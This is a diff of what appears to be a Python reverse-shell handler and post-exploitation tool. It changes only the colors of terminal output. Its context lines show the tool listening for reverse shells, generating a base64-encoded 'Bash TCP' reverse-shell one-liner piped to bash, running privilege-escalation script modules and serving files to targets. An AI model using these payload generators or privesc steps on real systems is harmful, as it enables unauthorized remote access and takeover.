@@ -384,7 +384,7 @@ class PBar:
 
 class paint:
 	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
-	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'orange':136, 'white':231, 'grey':244}
+	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'orange':208, 'white':15, 'lightgrey':7, 'darkgrey':8}
 	_escape = lambda codes: f"\001\x1b[{codes}m\002"
 
 	def __init__(self, text=None, colors=None):
@@ -1334,7 +1334,7 @@ class MainMenu(BetterCMD):
 		else:
 			if core.listeners:
 				table = Table(joinchar=' | ')
-				table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
+				table.header = [paint(header).orange for header in ('ID', 'Type', 'Host', 'Port')]
 				for listener in core.listeners.values():
 					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
 				print('\n', indent(str(table), '  '), '\n', sep='')
@@ -1843,7 +1843,7 @@ def Connect(host, port):
 	else:
 		if not core.started:
 			core.start()
-		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} {EMOJIS['target']}")
+		logger.info(f"Connected to {paint(host).blue}:{paint(port).orange} {EMOJIS['target']}")
 		session = Session(_socket, host, port)
 		if session:
 			return True
@@ -1891,7 +1891,7 @@ class TCPListener:
 		if self.host == '0.0.0.0':
 			specific = paint('→  ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])
 
-		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}")
+		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').white}{paint(self.port).orange} {specific}")
 
 		self.socket.listen(5)
 
@@ -1956,7 +1956,7 @@ class TCPListener:
 					continue
 				iface_name = paint(iface_name).GREEN
 			interface_count += 1
-			output.extend((f'➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).red)}', ''))
+			output.extend((f'➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).orange)}', ''))
 			output.append(str(paint("Bash TCP").UNDERLINE))
 			output.append(f"printf {base64.b64encode(presets[0].format(ip, port).encode()).decode()}|base64 -d|bash")
 			output.append("")
@@ -3177,13 +3177,13 @@ class Session:
 
 		logger.info(
 			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
-			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
-			f"{paint(escape_key).MAGENTA} "
+			f"{paint(', Shell Type:').green} {paint(self.type).CYAN_lightgrey}{paint(', Menu key:').green} "
+			f"{paint(escape_key).MAGENTA_lightgrey} "
 		)
 
 		if not options.no_log:
 			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} {EMOJIS['logfile']}")
-		print(paint('─').DIM * shutil.get_terminal_size()[0])
+		print(paint('─' * shutil.get_terminal_size()[0]).darkgrey)
 
 		core.attached_session = self
 		core.rlist.append(sys.stdin)
@@ -4525,7 +4525,7 @@ class peass_ng(Module):
 		elif session.OS == 'Windows':
 			logger.error("This module runs only on Unix shells")
 			while True:
-				answer = ask(f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}").lower()
+				answer = ask(f"Use {paint('upload_privesc_scripts').GREY_black}{paint(' instead? (Y/n): ').yellow}").lower()
 				if answer in ('y', ''):
 					menu.do_run('upload_privesc_scripts')
 					break
@@ -4959,7 +4959,7 @@ class FileServer:
 			ips = [ip for ip in Interfaces().list.values()]
 
 		for ip in ips:
-			output.extend(('', f'{EMOJIS["home"]} http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.url_prefix))
+			output.extend(('', f'{EMOJIS["home"]} http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).orange) + '/' + self.url_prefix))
 			table = Table(joinchar=' → ')
 			for urlpath, filepath in self.filemap.items():
 				table += (
